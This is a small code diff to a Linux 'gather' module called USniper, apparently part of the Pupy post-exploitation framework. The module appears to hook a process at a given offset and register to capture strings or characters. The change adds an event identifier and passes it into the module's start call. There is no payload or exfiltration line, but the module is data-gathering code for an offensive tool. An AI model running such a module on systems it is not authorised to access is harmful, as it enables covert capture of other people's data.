@@ -2,7 +2,12 @@
 
 from pupylib.PupyModule import config, PupyModule, PupyArgumentParser
 
+USNIPER_EVENT = 0x13000001
+
 __class_name__ = 'USniper'
+__events__ = {
+    USNIPER_EVENT: 'usniper'
+}
 
 @config(cat='gather', compat=['linux'])
 class USniper(PupyModule):
@@ -49,7 +54,8 @@ class USniper(PupyModule):
 
         if start(args.path, offset, args.reg, args.ret,
                  'string' if args.string else None,
-                     None if (args.string or args.nochar) else 'chr'):
+                     None if (args.string or args.nochar) else 'chr',
+                     event_id=USNIPER_EVENT):
             self.success('Unsipper started')
         else:
             self.error('Usniper start failed')
